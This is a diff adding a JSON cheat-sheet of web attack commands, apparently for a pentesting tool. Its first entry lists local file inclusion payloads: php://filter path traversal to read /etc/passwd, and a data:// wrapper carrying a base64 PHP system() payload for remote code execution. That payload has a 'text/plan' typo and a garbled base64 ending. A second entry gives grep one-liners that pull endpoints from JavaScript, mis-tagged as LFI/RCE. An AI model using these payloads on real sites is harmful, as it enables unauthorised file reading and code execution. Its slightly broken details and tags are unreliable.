@@ -1,0 +1,44 @@
+[
+  {
+    "title": "Read files/RCE with PHP wrappers",
+    "description": "Exploiting local file inclusion (LFI) with php filters",
+    "tags": [
+      "web",
+      "LFI",
+      "RCE"
+    ],
+    "data": [
+      {
+        "description": "PHP wrapper:",
+        "command": "fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd"
+      },
+      {
+        "description": "PHP wrapper (base64):",
+        "command": "fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
+      },
+      {
+        "description": "RCE through PHP data wrapper with base64:",
+        "command": "fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="
+      }
+    ]
+  },
+  {
+    "title": "Extract all endpoints from a javascript file",
+    "description": "",
+    "tags": [
+      "web",
+      "LFI",
+      "RCE"
+    ],
+    "data": [
+      {
+        "description": "",
+        "command": "cat files.txt | grep -aoP \"(?<=(\"|\\'|`))\\/[a-zA-Z0-9?&=\\/-#.](?=(\"|\\'|`))\" | sort -u | tee output.txt"
+      },
+      {
+        "description": "Or, alternatively:",
+        "command": "grep -aoP files.txt \"(?<=(\"|\\'|`))\\/[a-zA-Z0-9?&=\\/-#.](?=(\"|\\'|`))\" | sort -u | tee output.txt"
+      }
+    ]
+  }
+]
